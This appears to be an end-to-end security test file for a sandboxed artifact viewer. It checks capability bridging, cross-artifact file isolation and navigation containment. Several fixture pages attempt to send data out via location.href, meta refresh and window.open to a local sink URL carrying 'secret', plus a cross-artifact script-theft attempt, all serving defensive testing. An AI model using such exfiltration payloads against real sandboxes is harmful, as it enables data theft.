import assert from 'node:assert/strict'
import { existsSync, mkdtempSync, rmSync } from 'node:fs'
import { homedir, tmpdir } from 'node:os'
import { join } from 'node:path'
import { createServer, type Server } from 'node:http'
import { after, before, test } from 'node:test'
import { serve, type ServerType } from '@hono/node-server'
import { chromium, type Browser } from 'playwright-core'
import { createAppServer } from '../src/app-server.ts'
import { ArtifactStore } from '../src/artifact-store.ts'
import { createContentServer } from '../src/content-server.ts'

// Set CHROMIUM_PATH, or keep a Playwright headless shell in its default cache.
function findChromium(): string | undefined {
  if (process.env.CHROMIUM_PATH) return process.env.CHROMIUM_PATH
  const candidates = [
    join(homedir(), 'Library/Caches/ms-playwright/chromium_headless_shell-1248/chrome-headless-shell-mac-arm64/chrome-headless-shell'),
    '/usr/bin/chromium',
    '/usr/bin/chromium-browser'
  ]
  return candidates.find((path) => existsSync(path))
}

const chromiumPath = findChromium()
const TOKEN = 'e2e-token-0123456789'
const APP_PORT = 18790
const CONTENT_PORT = 18791
const SINK_PORT = 18799
let dir: string
let store: ArtifactStore
let servers: ServerType[] = []
let browser: Browser

const PAGE = `<!doctype html><html><head><title>Bridge</title></head><body>
<p id="count">?</p><p id="upload"></p><p id="leak">no</p>
<script>
const count = document.getElementById('count')
async function refresh() { const doc = await artifact.db.get('c', 'main'); count.textContent = String(doc?.data?.n ?? 0) }
artifact.db.subscribe(refresh)
refresh()
window.bump = async () => { const doc = await artifact.db.get('c', 'main'); await artifact.db.set('c', 'main', { n: (doc?.data?.n ?? 0) + 1 }) }
window.upload = async () => { const asset = await artifact.uploads.put(new Blob(['hi']), 'note.txt'); document.getElementById('upload').textContent = asset.url }
fetch('http://localhost:${APP_PORT}/api/artifacts').then(() => { document.getElementById('leak').textContent = 'yes' }, () => {})
</script></body></html>`

before(async () => {
  if (!chromiumPath) return
  dir = mkdtempSync(join(tmpdir(), 'artifacts-e2e-'))
  store = new ArtifactStore(dir)
  const config = {
    dataDir: dir,
    appPort: APP_PORT,
    contentPort: CONTENT_PORT,
    appOrigin: `http://localhost:${APP_PORT}`,
    contentOrigin: `http://127.0.0.1:${CONTENT_PORT}`,
    tokens: [TOKEN]
  }
  servers = [
    serve({ fetch: createAppServer(store, config).fetch, port: APP_PORT, hostname: '127.0.0.1' }),
    serve({ fetch: createContentServer(store, config).fetch, port: CONTENT_PORT, hostname: '127.0.0.1' })
  ]
  browser = await chromium.launch({ executablePath: chromiumPath })
})

after(async () => {
  if (!chromiumPath) return
  await browser.close()
  for (const server of servers) server.close()
  store.close()
  rmSync(dir, { recursive: true, force: true })
})

test('a sandboxed page reaches its capabilities only through the viewer, live across viewers', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: 'Bridge', capabilities: ['db', 'uploads'], files: { 'index.html': { content: Buffer.from(PAGE) } } })
  const first = await browser.newPage()
  const second = await browser.newPage()
  await first.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await second.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frameOf = (page: typeof first) => page.frameLocator('#frame')

  await frameOf(first).locator('#count').filter({ hasText: '0' }).waitFor()
  await frameOf(second).locator('#count').filter({ hasText: '0' }).waitFor()
  const pageFrame = first.frames().find((frame) => frame.url().includes(`:${CONTENT_PORT}/`))
  assert.ok(pageFrame)
  assert.equal(await pageFrame.evaluate(() => origin), 'null')

  await pageFrame.evaluate(() => (window as unknown as { bump: () => Promise<void> }).bump())
  // The other viewer learns of the write over the event stream, not by polling.
  await frameOf(second).locator('#count').filter({ hasText: '1' }).waitFor({ timeout: 5000 })

  await pageFrame.evaluate(() => (window as unknown as { upload: () => Promise<void> }).upload())
  await frameOf(first).locator('#upload').filter({ hasText: `/a/${id}/assets/` }).waitFor()
  assert.equal(store.listAssets(id)[0]?.source, 'page')

  assert.equal(await frameOf(first).locator('#leak').textContent(), 'no')
})

async function listenSink(): Promise<{ hits: string[]; server: Server }> {
  const hits: string[] = []
  const server = createServer((req, res) => {
    hits.push(req.url ?? '')
    res.end('<!doctype html><title>sink</title><script>window.addEventListener("message", () => {})</script>')
  })
  await new Promise<void>((resolve) => server.listen(SINK_PORT, '127.0.0.1', resolve))
  return { hits, server }
}

const EXFIL_PAGES: Record<string, string> = {
  'location.href': `<script>location.href = 'http://127.0.0.1:${SINK_PORT}/leak?d=secret'</script>`,
  'meta refresh': `<meta http-equiv="refresh" content="0;url=http://127.0.0.1:${SINK_PORT}/leak?d=secret">`,
  'window.open': `<button id="go" onclick="window.open('http://127.0.0.1:${SINK_PORT}/leak?d=secret')">go</button><script>window.open('http://127.0.0.1:${SINK_PORT}/leak?d=secret'); document.getElementById('go').click()</script>`
}

for (const [name, body] of Object.entries(EXFIL_PAGES)) {
  test(`a sandboxed page cannot send data out by navigation (${name})`, { skip: !chromiumPath && 'no Chromium found' }, async () => {
    const sink = await listenSink()
    try {
      const { id } = store.publish({ title: 'Exfil', capabilities: ['db'], files: { 'index.html': { content: Buffer.from(`<!doctype html><html><head></head><body>${body}</body></html>`) } } })
      const context = await browser.newContext()
      const page = await context.newPage()
      await page.goto(`http://localhost:${APP_PORT}/a/${id}`)
      await page.waitForTimeout(1500)
      assert.deepEqual(sink.hits, [])
      assert.equal(context.pages().length, 1)
      assert.ok(page.frames().every((frame) => !frame.url().includes(`:${SINK_PORT}`)))
      await context.close()
    } finally {
      sink.server.close()
    }
  })
}

test('an artifact page cannot load another artifact\'s files', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const other = store.publish({ title: 'Other', files: { 'index.html': { content: Buffer.from('x') }, 'data.js': { content: Buffer.from("window.STOLEN = 'yes'") } } })
  const page = `<!doctype html><html><head></head><body><p id="seen">no</p>
<script src="http://127.0.0.1:${CONTENT_PORT}/a/${other.id}/v/1/data.js"></script>
<script>document.getElementById('seen').textContent = typeof window.STOLEN === 'undefined' ? 'no' : 'yes'</script></body></html>`
  const { id } = store.publish({ title: 'Mine', files: { 'index.html': { content: Buffer.from(page) } } })
  const viewer = await browser.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await viewer.frameLocator('#frame').locator('#seen').waitFor()
  assert.equal(await viewer.frameLocator('#frame').locator('#seen').textContent(), 'no')
  await viewer.close()
})

test('a rendered page opened top-level on the content origin is sent back into the viewer, not left free to navigate out', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const sink = await listenSink()
  try {
    const page = `<!doctype html><html><head></head><body><script>location.href = 'http://127.0.0.1:${SINK_PORT}/leak?d=' + encodeURIComponent(document.title)</script></body></html>`
    const { id } = store.publish({ title: 'Direct', files: { 'index.html': { content: Buffer.from(page) } } })
    const context = await browser.newContext()
    const tab = await context.newPage()
    await tab.goto(`http://127.0.0.1:${CONTENT_PORT}/a/${id}/v/1/`)
    await tab.waitForTimeout(1500)
    // The viewer drops ?v= for the latest version.
    assert.equal(tab.url(), `http://localhost:${APP_PORT}/a/${id}`)
    assert.ok(tab.frames().every((frame) => !frame.url().includes(`:${SINK_PORT}`)))
    assert.deepEqual(sink.hits, [])
    await context.close()
  } finally {
    sink.server.close()
  }
})

test('links between pages of one artifact navigate inside the viewer frame', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({
    title: 'Multi',
    files: {
      'index.html': { content: Buffer.from('<!doctype html><html><head></head><body><a id="next" href="other.html">next</a></body></html>') },
      'other.html': { content: Buffer.from('<!doctype html><html><head></head><body><p id="here">other page</p></body></html>') }
    }
  })
  const viewer = await browser.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await viewer.frameLocator('#frame').locator('#next').click()
  await viewer.frameLocator('#frame').locator('#here').waitFor()
  assert.equal(viewer.url(), `http://localhost:${APP_PORT}/a/${id}`)
  assert.ok(viewer.frames().some((frame) => frame.url().endsWith('/other.html')))
  await viewer.close()
})
